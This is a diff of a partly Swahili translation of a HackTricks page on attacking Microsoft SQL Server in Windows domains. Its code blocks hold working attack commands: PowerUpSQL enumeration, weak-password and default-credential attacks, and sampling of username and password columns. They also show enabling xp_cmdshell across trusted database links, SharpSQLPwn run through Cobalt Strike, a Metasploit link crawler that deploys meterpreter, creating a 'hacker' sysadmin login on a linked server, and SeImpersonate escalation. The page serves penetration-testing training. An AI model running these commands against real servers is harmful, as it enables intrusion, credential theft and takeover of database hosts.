@@ -3,11 +3,11 @@
 {{#include ../../banners/hacktricks-training.md}}
 
 
-## **MSSQL Enumeration / Discovery**
+## **MSSQL Uainishaji / Ugunduzi**
 
 ### Python
 
-Chombo cha [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) kinategemea impacket, na pia kinaruhusu kuthibitisha kwa kutumia tiketi za kerberos, na kushambulia kupitia minyororo ya viungo.
+Zana ya [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) inategemea impacket, na pia inaruhusu kuthibitisha kwa kutumia tiketi za kerberos, na kushambulia kupitia minyororo ya viungo.
 
 <figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
 ```shell
@@ -91,11 +91,11 @@ mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
 ###  Powershell
 
 Moduli ya powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) ni muhimu sana katika kesi hii.
-```powershell
+```bash
 Import-Module .\PowerupSQL.psd1
 ````
 ### Kuorodhesha kutoka kwenye mtandao bila kikao cha kikoa
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -109,7 +109,7 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
 ### Kuorodhesha kutoka ndani ya eneo
-```powershell
+```bash
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
 Get-SQLInstanceLocal | Get-SQLServerInfo
@@ -117,6 +117,12 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
 Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
+
+# Try dictionary attack to login
+Invoke-SQLAuditWeakLoginPw
+
+# Search SPNs of common software and try the default creds
+Get-SQLServerDefaultLoginPw
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -127,14 +133,26 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
-## MSSQL Msingi wa Kutumiwa
+## MSSQL Basic Abuse
 
-### Upatikanaji wa DB
-```powershell
+### Access DB
+```bash
+# List databases
+Get-SQLInstanceDomain | Get-SQLDatabase
+
+# List tables in a DB you can read
+Get-SQLInstanceDomain | Get-SQLTable -DatabaseName DBName
+
+# List columns in a table
+Get-SQLInstanceDomain | Get-SQLColumn -DatabaseName DBName -TableName TableName
+
+# Get some sample data from a column in a table (columns username & passwor din the example)
+Get-SQLInstanceDomain | GetSQLColumnSampleData -Keywords "username,password" -Verbose -SampleSize 10
+
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
 
-#Dump an instance (a lotof CVSs generated in current dir)
+#Dump an instance (a lot of CVSs generated in current dir)
 Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 
 # Search keywords in columns trying to access the MSSQL DBs
@@ -144,26 +162,26 @@ Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" }
 ### MSSQL RCE
 
 Inaweza pia kuwa inawezekana **kutekeleza amri** ndani ya mwenyeji wa MSSQL
-```powershell
+```bash
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Angalia katika ukurasa ulioelezwa katika **sehemu ifuatayo jinsi ya kufanya hivi kwa mikono.**
+Check in the page mentioned in the **following section how to do this manually.**
 
-### Njia za Msingi za Kudhuru MSSQL
+### MSSQL Basic Hacking Tricks
 
 {{#ref}}
 ../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/
 {{#endref}}
 
-## Viungo Vilivyoaminika vya MSSQL
+## MSSQL Trusted Links
 
-Ikiwa mfano wa MSSQL umeaminika (kiungo cha database) na mfano mwingine wa MSSQL. Ikiwa mtumiaji ana mamlaka juu ya database iliyoaminika, ataweza **kutumia uhusiano wa kuaminiana kutekeleza maswali pia katika mfano mwingine**. Hizi kuaminika zinaweza kuunganishwa na kwa wakati fulani mtumiaji anaweza kupata database iliyo na mipangilio isiyo sahihi ambapo anaweza kutekeleza amri.
+Ikiwa mfano wa MSSQL unaminiwa (kiungo cha database) na mfano mwingine wa MSSQL. Ikiwa mtumiaji ana mamlaka juu ya database iliyoaminiwa, ataweza **kutumia uhusiano wa kuaminiana kutekeleza maswali pia katika mfano mwingine**. Hii inategemea inaweza kuunganishwa na kwa wakati fulani mtumiaji anaweza kupata database isiyo na usanidi mzuri ambapo anaweza kutekeleza amri.
 
-**Viungo kati ya databases vinatumika hata katika kuaminiana kwa misitu.**
+**Viungo kati ya databases vinafanya kazi hata kupitia uaminifu wa msitu.**
 
-### Kunyanyaswa kwa Powershell
-```powershell
+### Powershell Abuse
+```bash
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
 
@@ -194,21 +212,27 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
+Zana nyingine inayofanana ambayo inaweza kutumika ni [**https://github.com/lefayjey/SharpSQLPwn**](https://github.com/lefayjey/SharpSQLPwn):
+```bash
+SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+# Cobalt Strike
+inject-assembly 4704 ../SharpCollection/SharpSQLPwn.exe /modules:LIC /linkedsql:<fqdn of SQL to exeecute cmd in> /cmd:whoami /impuser:sa
+```
 ### Metasploit
 
-Unaweza kwa urahisi kuangalia viungo vya kuaminika ukitumia metasploit.
+Unaweza kwa urahisi kuangalia viungo vinavyoaminika kwa kutumia metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
-Tafadhali kumbuka kwamba metasploit itajaribu kutumia tu kazi ya `openquery()` katika MSSQL (hivyo, ikiwa huwezi kutekeleza amri na `openquery()` utahitaji kujaribu njia ya `EXECUTE` **kwa mikono** kutekeleza amri, angalia zaidi hapa chini.)
+Kumbuka kwamba metasploit itajaribu kutumia tu kazi ya `openquery()` katika MSSQL (hivyo, ikiwa huwezi kutekeleza amri na `openquery()` utahitaji kujaribu njia ya `EXECUTE` **kwa mikono** kutekeleza amri, angalia zaidi hapa chini.)
 
 ### Mikono - Openquery()
 
 Kutoka **Linux** unaweza kupata shell ya MSSQL console kwa kutumia **sqsh** na **mssqlclient.py.**
 
-Kutoka **Windows** pia unaweza kupata viungo na kutekeleza amri kwa mikono ukitumia **MSSQL client kama** [**HeidiSQL**](https://www.heidisql.com)
+Kutoka **Windows** unaweza pia kupata viungo na kutekeleza amri kwa mikono ukitumia **MSSQL client kama** [**HeidiSQL**](https://www.heidisql.com)
 
 _Ingia kwa kutumia uthibitisho wa Windows:_
 
@@ -244,7 +268,7 @@ Ikiwa huwezi kufanya vitendo kama `exec xp_cmdshell` kutoka `openquery()`, jarib
 
 ### Manual - EXECUTE
 
-Unaweza pia kutumia vibaya viungo vinavyoaminika kwa kutumia `EXECUTE`:
+Unaweza pia kutumia viungo vya kuaminika kwa kutumia `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
@@ -252,9 +276,9 @@ EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT 
 ```
 ## Local Privilege Escalation
 
-Mkasisi wa **MSSQL local user** kwa kawaida ana aina maalum ya ruhusa inayoitwa **`SeImpersonatePrivilege`**. Hii inaruhusu akaunti "kujifanya mteja baada ya uthibitisho".
+Mtumiaji wa **MSSQL wa ndani** kwa kawaida ana aina maalum ya ruhusa inayoitwa **`SeImpersonatePrivilege`**. Hii inaruhusu akaunti "kujifanya mteja baada ya uthibitisho".
 
-Mkakati ambao waandishi wengi wamekuja nao ni kulazimisha huduma ya SYSTEM kuthibitisha kwa huduma ya rogue au man-in-the-middle ambayo mshambuliaji anaunda. Huduma hii ya rogue inaweza kujifanya huduma ya SYSTEM wakati inajaribu kuthibitisha.
+Mkakati ambao waandishi wengi wamekuja nao ni kulazimisha huduma ya SYSTEM kuthibitisha kwa huduma ya uasi au mtu katikati ambayo mshambuliaji anaunda. Huduma hii ya uasi inaweza kujifanya kama huduma ya SYSTEM wakati inajaribu kuthibitisha.
 
 [SweetPotato](https://github.com/CCob/SweetPotato) ina mkusanyiko wa mbinu hizi mbalimbali ambazo zinaweza kutekelezwa kupitia amri ya `execute-assembly` ya Beacon.
 
